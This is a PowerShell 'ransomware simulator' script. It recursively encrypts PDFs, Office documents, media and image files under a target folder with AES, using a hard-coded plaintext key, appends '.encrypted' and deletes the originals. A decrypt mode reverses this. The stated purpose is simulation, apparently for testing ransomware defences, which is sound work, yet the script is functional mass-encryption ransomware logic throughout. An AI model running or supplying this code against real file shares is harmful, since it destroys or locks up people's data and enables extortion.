 <#

.SYNOPSIS
Ransomware Simulator that leverages AES symmetrical encryption to target specified file types based on defined starting path and all sub-directories. e.g. c:\fileshares

.DESCRIPTION
This powershell script encrypts or decrypts files using a symmetrical key using AES encryption

.EXAMPLE
.\RanSim.ps1 -mode encrypt

To decrypt encrypted files:
.\RanSim.ps1 -mode decrypt 

.PARAMETER Target File Path
	Specify a the root directory that will be targeted along with sub-directories for file encryption.  Example c:\fileshares
 
.PARAMETER FilesTypes
	This parameter is  mandatory, but can be adjusted to which file types to encrypt.  Wild cards are suppoorted for files such as *.doc* which will encryption .doc and .docx.
		Office : Will generate files with the following extensions: "*.pptx","*.docx","*.doc","*.xls","*.rft","*.txt",".pdf","*.ppt",,"*.dot"
		Multimedia : Will create random files with the following extensions : "*.avi","*.midi","*.mov","*.mp3","*.mp4","*.mpeg","*.mpeg2","*.mpeg3","*.mpg","*.ogg"

.PARAMETER File Extension
    This parameter is mandatory and defines what the encrypted files will be appended with once attacked.  Example .encrypted

.PARAMETER Encryption key
    This parameter is mandatory and is the plain-text AES encryption key used for both encryption and decryption.  A pre-defined key is provided.  A new key can be generated and replaced in the global variables.

.NOTES
The script will encrypt or decrypt from the file target path and all sub-directories below.  Encryption extension will be appended to encrypted files.
You can choose which file types by extension will be encrypted in the global variables.

Leverages FileCryptopgraphy module from Tyler Siegrist - https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d

#>

#declare our named parameters passed from command line
param([string]$Mode,
      [string]$TargetPath = "C:\File Shares",
      [string]$Extension = ".encrypted",
      [string]$Key = "S4Xe7C57wbNVgmUss7xUjJOoICLdaW1Zgrks4s1hN4E="
)

#==== global variables ===================================================================================
#target file types
$TargetFiles = '*.pdf*','*.mp3*','*.xls*','*.ppt*','*.doc*','*.mpg*','*.mpeg*','*.rtf*','*.jpg*','*.jpeg*','*.png*','*.gif*'


#END ==== global variables ===============================================================================
#do not edit below here

#import crypto functions (assumes module is in the same folder as this script)
Import-Module "$PSScriptRoot\FileCryptography.psm1"

if ($mode -eq "encrypt") {
    #find files to encrypt
    $FilestoEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Recurse -force | where { ! $_.PSIsContainer }

    #encrypt each file

    foreach ($file in $FilestoEncrypt)
    {
        Write-Host "Encrypting $file"
        Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension -RemoveSource
    }
    Write-Host "Encrypted all files." | Start-Sleep -Seconds 10
}

elseif ($mode -eq "decrypt") {
    #find files to decrypt
    $FilestoDecrypt = get-childitem -path $TargetPath\* -Include *$Extension -Recurse -force | where { ! $_.PSIsContainer }

    #encrypt each file

    foreach ($file in $FilestoDecrypt)
    {
        Write-Host "Decrypting $file"
        Unprotect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension  -RemoveSource
    }
} 

else {
    write-host "You need to specify a target mode - encrypt or decrypt. Example for encryption - .\ransim.ps1 -mode encrypt"
} #END if
exit 
